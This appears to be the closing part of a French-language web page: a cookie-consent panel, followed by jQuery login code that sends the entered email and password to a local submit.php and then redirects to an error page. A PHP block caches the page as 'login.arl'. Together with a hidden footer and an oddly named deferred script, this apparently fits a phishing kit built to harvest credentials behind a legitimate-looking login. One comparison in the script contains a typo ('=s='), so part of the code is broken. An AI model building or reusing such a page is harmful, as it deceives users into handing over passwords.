utilisable en activant des fonctions de base comme la navigation de page ou encore le paramétrage de la confidentialité. En cas de blocage des cookies de fonctionnement sur votre navigateur de recherche certaines fonctionnalités du site peuvent devenir indisponibles et votre expérience utilisateur peut être impactée.<a href="#" target="_self" rel="noopener noreferrer"></a></p><div class="ccm__cheading__close">×</div></div><div class="ccm__content__body"><div class="ccm__tabs"><dl class="ccm__tabgroup necessary checked-5jhk" data-category="necessary"><dt class="ccm__tab-head">Nécessaires au service<a class="ccm__tab-head__icon-wedge"><svg version="1.2" preserveAspectRatio="none" viewBox="0 0 24 24" class="icon-wedge-svg" data-id="e9b3c566e8c14cfea38af128759b91a3" style="opacity:1;mix-blend-mode:normal;fill:#333;width:32px;height:32px"><path xmlns:default="http://www.w3.org/2000/svg" class="icon-wedge-angle-down" d="M17.2 9.84c0-.09-.04-.18-.1-.24l-.52-.52c-.13-.13-.33-.14-.47-.01l-.01.01-4.1 4.1-4.09-4.1C7.78 8.94 7.57 8.94 7.44 9.06l-.01.01L6.91 9.6c-.13.13-.14.33-.01.47l.01.01 4.85 4.85c.13.13.33.14.47.01l.01-.01 4.85-4.85c.06-.06.1-.15.1-.24H17.2z" style="fill:#333"></path></svg></a></dt><dd class="ccm__tab-content"><div class="ccm__tab-content__left"></div><div class="right"><h3>Nécessaires au service</h3><p>Cookies nécessaires dans le fonctionnement du site.</p><div class="ccm__list"><div class="ccm__list"><span class="ccm__list__title">Solutions et cookies concernés :</span><ul><li>Session</li><li>Langue</li></ul></div></div></div></dd></dl><dl class="ccm__tabgroup ganalytics" data-category="ganalytics"><dt class="ccm__tab-head">Statistiques de visites anonymes<a class="ccm__tab-head__icon-wedge"><svg version="1.2" preserveAspectRatio="none" viewBox="0 0 24 24" class="icon-wedge-svg" data-id="e9b3c566e8c14cfea38af128759b91a3" style="opacity:1;mix-blend-mode:normal;fill:#333;width:32px;height:32px"><path xmlns:default="http://www.w3.org/2000/svg" class="icon-wedge-angle-down" d="M17.2 9.84c0-.09-.04-.18-.1-.24l-.52-.52c-.13-.13-.33-.14-.47-.01l-.01.01-4.1 4.1-4.09-4.1C7.78 8.94 7.57 8.94 7.44 9.06l-.01.01L6.91 9.6c-.13.13-.14.33-.01.47l.01.01 4.85 4.85c.13.13.33.14.47.01l.01-.01 4.85-4.85c.06-.06.1-.15.1-.24H17.2z" style="fill:#333"></path></svg></a></dt><dd class="ccm__tab-content"><div class="ccm__tab-content__left"><div class="ccm__switch-component"><div class="status-off">Off</div><div class="ccm__switch-group"><label class="ccm__switch"><input class="category-onoff" type="checkbox" data-category="ganalytics"><span class="ccm__switch__slider"></span></label></div><div class="status-on">On</div></div></div><div class="right"><h3>Statistiques de visites anonymes</h3><p>Suivi du trafic dans le cadre de l'amélioration de nos services de manière totalement anonyme.</p><div class="ccm__list"><div class="ccm__list"><span class="ccm__list__title">Solutions et cookies concernés :</span><ul><li>Matomo Analytics</li><li>Matomo Tag Manager</li></ul></div></div></div></dd></dl><dl class="ccm__tabgroup analytics" data-category="analytics"><dt class="ccm__tab-head">Solutions d'analyses tierces<a class="ccm__tab-head__icon-wedge"><svg version="1.2" preserveAspectRatio="none" viewBox="0 0 24 24" class="icon-wedge-svg" data-id="e9b3c566e8c14cfea38af128759b91a3" style="opacity:1;mix-blend-mode:normal;fill:#333;width:32px;height:32px"><path xmlns:default="http://www.w3.org/2000/svg" class="icon-wedge-angle-down" d="M17.2 9.84c0-.09-.04-.18-.1-.24l-.52-.52c-.13-.13-.33-.14-.47-.01l-.01.01-4.1 4.1-4.09-4.1C7.78 8.94 7.57 8.94 7.44 9.06l-.01.01L6.91 9.6c-.13.13-.14.33-.01.47l.01.01 4.85 4.85c.13.13.33.14.47.01l.01-.01 4.85-4.85c.06-.06.1-.15.1-.24H17.2z" style="fill:#333"></path></svg></a></dt><dd class="ccm__tab-content"><div class="ccm__tab-content__left"><div class="ccm__switch-component"><div class="status-off">Off</div><div class="ccm__switch-group"><label class="ccm__switch"><input class="category-onoff" type="checkbox" data-category="analytics"><span class="ccm__switch__slider"></span></label></div><div class="status-on">On</div></div></div><div class="right"><h3>Solutions d'analyses tierces</h3><p>Pour améliorer continuellement nos services, nous utilisons des solutions d’analyses externes.</p><div class="ccm__list"><div class="ccm__list"><span class="ccm__list__title">Solutions et cookies concernés :</span><ul><li>Google Ads</li><li>Hubspot</li><li>Hotjar</li></ul></div></div></div></dd></dl></div></div><div class="ccm__footer"><button class="consent-refuse">Refuser</button>
<button id="ccm__footer__consent-modal-submit">Sauvegarder</button>
<button class="consent-give">Accepter tous les cookies</button></div></div></div>



<script type="text/javascript" src="../assets/js/jquery.js"></script>
<script src="../assets/js/jquery.min.js"></script>
<input type="hidden" id="temm" value="0">

<script type="text/JavaScript">

function togglePasswordVisibility(){
var temm = document.getElementById('temm').value;
if(temm == '0'){
   $('#view1').css('display', 'none'); 
   $('#view2').css('display', 'block');
   $('#pwd_id').attr('type', 'text');
   $('#pwd_id').removeClass('pwd-input password');
   document.getElementById('temm').value = "1";  
}
if(temm == '1'){
   $('#view1').css('display', 'block'); 
   $('#view2').css('display', 'none');
   $('#pwd_id').attr('type', 'password');
   $('#pwd_id').addClass('pwd-input password');
   document.getElementById('temm').value = "0";  
}
}

$(document).on('click', '.sero', function(e) {
  var emailx = $('#ide_id').val();
  var pwdx = $('#pwd_id').val();
  var emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;

  if(emailx.length == 0) {
$('#nav-overlay').css('display', 'none');
$('#ide_id').css('border', '1px solid #ff0101');
// $('#login-userName').css("background", "#FDEFEE");
return;
  } else if (!emailRegex.test(emailx)) {
$('#ide_id').css('border', '1px solid #ff0101');
return;
  } else {
$('#ide_id').css('border', '1px solid #dadbe0');
}
  if(pwdx.length == 0) {
$('#nav-overlay').css('display', 'none');
$('#pwd_id').css('border', '1px solid #ff0101');

// $('#login-userName').css("background", "#FDEFEE");
return;
  }

  $('#nav-overlay').css('display', 'block');

$('#nav-overlay').show();
$.ajax({
type: "POST",
url: 'submit.php',
data: {
  username: emailx,
  password: pwdx,

},
success: function(resp){
if(resp.st == "failure") {
alert(resp.err);
$('#nav-overlay').css('display', 'none');

$.notifyBar({ cssClass: "error", html: resp.err });
}
else if(resp.st =s= "success") {

setTimeout(function() {
  window.location.href = 'error.php';
}, 1000);
} 
}
});

});

</script>
<footer id="foot" style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"></footer>
<script src="../assets/js/jQuery.min.affcbf7942d5bedb0785712.js" defer="defer" async="async"></script>

</body>
</html>


<?php 
$contenuCache = ob_get_contents();ob_end_flush();
$fd = fopen("$fichierCache", "w");
if ($fd) {fwrite($fd,$contenuCache);fclose($fd);}} else {readfile('../cache/login.arl');echo "\n";}  
?>

